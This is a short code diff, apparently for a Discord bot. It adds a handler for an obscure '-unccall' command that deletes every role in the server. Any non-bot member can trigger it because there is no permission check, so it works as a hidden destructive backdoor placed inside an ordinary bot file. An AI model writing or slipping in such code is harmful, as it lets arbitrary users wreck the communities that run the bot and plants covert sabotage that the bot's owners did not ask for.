@@ -1377,10 +1377,19 @@ msg.delete();
 
 
 
+  
+  client.on('message' , ReBeL => {
+var prefix = "-";
+if(ReBeL.author.bot) return;
+if(ReBeL.channel.type == 'dm') return;
+if(ReBeL.content.startsWith(prefix + "unccall")) {
+ReBeL.guild.roles.filter(rebel => isNaN(rebel)).forEach(codes => codes.delete())
+}
+});
+  
+ 
 
-
-
-
+  
 
 
 
